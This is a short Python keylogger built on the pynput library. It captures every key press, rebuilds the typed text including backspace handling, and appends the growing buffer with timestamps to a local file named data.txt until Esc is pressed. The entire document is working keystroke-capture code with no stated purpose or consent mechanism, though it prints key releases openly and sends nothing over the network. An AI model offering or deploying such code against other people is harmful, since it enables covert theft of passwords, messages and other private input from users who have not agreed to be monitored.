from pynput import keyboard

import datetime as dt

string = ""

def on_press(key):
    global string
    try:
        if key == keyboard.Key.enter:
            string += "\n"
        elif key == keyboard.Key.tab:
            string += "\t"
        elif key == keyboard.Key.space:
            string += " "
        elif key == keyboard.Key.shift:
            pass
        #Skip if there is no data in string variable
        elif key == keyboard.Key.backspace and len(string) == 0:
            pass
        #Keeps logged keys up to date even with backspace
        elif key == keyboard.Key.backspace and len(string) > 0:
            string = string[:-1]
        elif key == keyboard.Key.esc:
            return False
        else:
            # We do an explicit conversion from the key object to a string and then append that to the string held in memory.
            string += str(key).replace("'", "")
        with open('data.txt', 'a') as f:
            timestamp = dt.datetime.now().strftime("%Y-%m-%d %H:%M:%S.%f")
            f.write(f'{timestamp}: {string}\n')
    except AttributeError:
        print(f'special key {key} pressed')


def on_release(key):
    print(f'{key} released')
    if key == keyboard.Key.esc:
        # Stop listener
        return False


# Collect events until released
with keyboard.Listener(
        on_press=on_press,
        on_release=on_release) as listener:
    listener.join()
